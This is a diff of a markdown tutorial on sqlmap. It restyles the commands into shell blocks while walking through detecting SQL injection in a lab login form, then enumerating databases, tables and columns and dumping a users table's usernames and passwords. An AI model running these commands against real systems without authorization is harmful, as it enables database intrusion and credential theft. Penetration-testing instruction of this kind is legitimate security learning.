@@ -4,9 +4,8 @@ The sqlmap tool makes sql injection and detection very trivial. I use this tool 
 
 ## Usage
 
-Running `ffuf -h` provided the following output:
-
 ```bash
+$ sqlmap -h
         ___
        __H__
  ___ ___[)]_____ ___ ___  {1.4.4#stable}
@@ -105,7 +104,7 @@ Options:
 
 When I see a login form and I want to test if it vulnerable to a sql injection attack, I'll capture a login request using the developer toolbar or Burp. I'll copy that request to a file and name it `request.txt`. The sqlmap tool will take care of the rest. Here is a sample request that I have saved in the `request.txt` file:
 
-```
+```text
 POST /api/login HTTP/1.1
 Host: 10.10.191.223
 Content-Length: 32
@@ -123,13 +122,9 @@ username=admin&password=password
 
 Now running the following command will check if this form is vulnerable to a sql injection attack:
 
-`sqlmap -r request.txt`
-
-The sqlmap tool will examine the request and check each parameter being sent in the request. For this example it will check if username is vulnerable to a sql injection attack then it will run the same test for the password parameter. It tests the parameters by checking if it can get a timeout for the request. It will add a delay of like five seconds to each parameter request and if the response takes more than five seconds, it will know that the parameter is vulnerable to the attack and what type of database the site is using.
-
-Some of the output from the above request and sqlmap run is as follows:
-
 ```bash
+$ sqlmap -r request.txt
+...
 [04:55:26] [INFO] checking if the injection point on POST parameter 'username' is a false positive
 POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
 sqlmap identified the following injection point(s) with a total of 158 HTTP(s) requests:
@@ -142,17 +137,17 @@ Parameter: username (POST)
 [04:55:47] [INFO] the back-end DBMS is MySQL
 ```
 
+The sqlmap tool will examine the request and check each parameter being sent in the request. For this example it will check if username is vulnerable to a sql injection attack then it will run the same test for the password parameter. It tests the parameters by checking if it can get a timeout for the request. It will add a delay of like five seconds to each parameter request and if the response takes more than five seconds, it will know that the parameter is vulnerable to the attack and what type of database the site is using.
+
 As mentioned before, the username parameter is vulnerable and the backend is MySQL.
 
 ### Getting Databases
 
 Now that I know that the username parameter is vulnerable, I can start to get useful information. First, I need to know what databases are in this instance of MySQL. I run the following command:
 
-`sqlmap -r request.txt --dbs`
-
-After a few minutes I got the following output:
-
 ```bash
+$ sqlmap -r request.txt --dbs
+...
 available databases [2]:
 [*] gallery_db
 [*] information_schema
@@ -162,11 +157,9 @@ available databases [2]:
 
 There are two databases, I can now select a database and get all the tables for that database. In my example, I only care about the gallery database. So I run the following command to get all the tables in the `gallery_db` database:
 
-`sqlmap -r request.txt -D gallery_db --tables`
-
-This produces the following output:
-
 ```bash
+$ sqlmap -r request.txt -D gallery_db --tables
+...
 Database: gallery_db
 [4 tables]
 +-------------+
@@ -181,11 +174,9 @@ Database: gallery_db
 
 Looking at the list, users is the table that I want to start pulling data from. I'll wager that I don't need most of the columns for this table. I am going to get the columns for the users table by running the following command:
 
-`sqlmap -r request.txt -D gallery_db -T users --columns`
-
-This produces the following output:
-
 ```bash
+$ sqlmap -r request.txt -D gallery_db -T users --columns
+...
 Database: gallery_db
 Table: users
 [10 columns]
@@ -209,15 +200,15 @@ Table: users
 
 Now I can get records for the users table. If I don't want to filter the columns I can run the following:
 
-`sqlmap -r request.txt -D gallery_db -T users --dump`
+```bash
+$ sqlmap -r request.txt -D gallery_db -T users --dump
+```
 
 In my case I want to filter it. This is because it will ask yes or no questions over and over to get each character of data. That takes a lot of time and I want to speed things up. Here is the command I run to filter the columns that I want for each record:
 
-`sqlmap -r request.txt -D gallery_db -T users -C firstname,username,password --dump`
-
-This produces the following output:
-
 ```bash
+$ sqlmap -r request.txt -D gallery_db -T users -C firstname,username,password --dump
+...
 Database: gallery_db
 Table: users
 [1 entry]
